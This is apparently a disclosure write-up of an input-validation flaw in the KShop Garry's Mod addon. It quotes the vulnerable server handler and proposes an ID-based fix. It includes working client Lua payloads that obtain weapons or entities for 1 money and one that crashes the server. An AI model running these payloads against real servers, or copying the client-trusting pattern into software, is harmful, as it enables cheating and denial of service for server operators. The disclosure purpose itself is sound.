# KShop Net Exploit
Found by OverlordAkise on 2021.05.26  
Addon is available on the workshop.  
This addon is still used on servers.  

KShop has an exploit in the KS_BuyItem net.Receive function.


### TL;DR
KShop takes the weapon and price of it from the player. This means that any player can send a malformed table over the `KS_BuyItem` net channel and get any weapon they want for 0 ingame money. This also allows players to spawn any entity they want, as the shop also is used for selling entities.  



### The Code
This is the Code that is responsible for the vulnerability.
```LUA 
function KShop:BuyItem(data, ply)
	if ply.kshopwait != nil then
		DarkRP.notify(ply, 1, 5, "You need to wait a bit.")
		return
	end

	ply.kshopwait = false
	timer.Simple(2, function() if IsValid(ply) then ply.kshopwait = nil end end)
	if not ply:canAfford(data.price) then
		--if !data.price == 0 then
			DarkRP.notify(ply, 1, 5, "You can't afford "..DarkRP.formatMoney(data.price).."!")
			return
		--end
	end
	local typ = data.typ
	if data.typ == "weapon" then
		if !ply:HasWeapon(data.item) then
			ply:Give(data.item)
			ply:addMoney(-data.price)
			ply:SelectWeapon(data.item)
			DarkRP.notify(ply, 0, 5, "You bought a "..data.name.." for "..DarkRP.formatMoney(data.price)..".")
		else
			DarkRP.notify(ply, 1, 5, "You already have a "..data.name..".")
		end
	elseif data.typ == "entity" then
		if not data.item then return end
		local ent = ents.Create(data.item)
		ent:SetPos(ply:GetPos())
		ent:Spawn()
		ent:Activate()
		ply:addMoney(-data.price)
		DarkRP.notify(ply, 0, 5, "You bought a "..data.name.." for "..DarkRP.formatMoney(data.price)..".")
	elseif data.typ == "hp" then
		local max = ply:GetMaxHealth()
		local hp = ply:Health()
		if hp == max then
			DarkRP.notify(ply, 1, 5, "You already have "..tostring(max).." hp.")
			return
		end
		if not data.hp then return end
		if hp + data.hp > max then
			ply:SetHealth(max)
			DarkRP.notify(ply, 0, 5, "You got "..tostring( math.abs( ((data.hp+hp)-100)-data.hp ) ).." hp.")
		else
			ply:SetHealth(hp+data.hp)
			DarkRP.notify(ply, 0, 5, "You got "..tostring(data.hp).." hp.")
		end
		ply:addMoney(-data.price)
	elseif typ == "armor" then
		local max = KShop.MaxArmor
		local armor = ply:Armor()
		if armor == max then
			DarkRP.notify(ply, 1, 5, "You already have "..tostring(max).." armor.")
			return
		end
		if not data.armor then return end
		if armor + data.armor > max then
			ply:SetArmor(max)
			DarkRP.notify(ply, 0, 5, "You got "..tostring( math.abs( ((data.armor+armor)-100)-data.armor ) ).." armor.")
		else
			ply:SetArmor(armor+data.armor)
			DarkRP.notify(ply, 0, 5, "You got "..tostring(data.armor).." armor.")
		end
		ply:addMoney(-data.price)		
	end
end
net.Receive("KS_BuyItem", function(_, ply)
	local data = net.ReadTable()
	if !data then return end
	KShop:BuyItem(data, ply)
end)
```



### The Problem
```LUA
local data = net.ReadTable()
--[...]
ply:Give(data.item)
ply:addMoney(-data.price)
```
The player can send any item and price without the server checking the input. This means you can literally spawn any entity or weapon for 0 ingame money this way, as the server neither checks nor sanitizes inputs.  



### Example Code / Comments
An example to give the player a crowbar for 1 ingame money:
```LUA
net.Start("KS_BuyItem")
  net.WriteTable({price=1,typ="weapon",item="weapon_crowbar"})
net.SendToServer()
```
The above lua code, if executed on the client, gives the player a crowbar and substracts 1 ingame money from them.  
This works with any weapon class that exists on the server.  

This also works for spawning entities and HP/Armor. An example for spawning an entity:
```LUA
net.Start("KS_BuyItem")
  net.WriteTable({price=1,typ="entity",item="sent_ball"})
net.SendToServer()
```

An example that actually crashes the server if executed:
```LUA
net.Start("KS_BuyItem")
  net.WriteTable({price=1,typ="entity",item="worldspawn"})
net.SendToServer()
```



### Fixing the exploit
The fix for this won't be easy. It needs a complete rewrite of the net.Receive function.  
The User shouldn't send the whole table of details but just an ID of what item from the available they want to buy.  
This 
```LUA
local data = net.ReadTable()
--[...]
ply:Give(data.item)
ply:addMoney(-data.price)
``` 
needs to be re-written to this
```LUA
local id = net.ReadInt(32)
--[...]
if shop_items[i] then
  ply:Give(shop_items[i].item)
  ply:addMoney(-1 * shop_items[i].price)
end
``` 
and then it's not exploitable anymore.
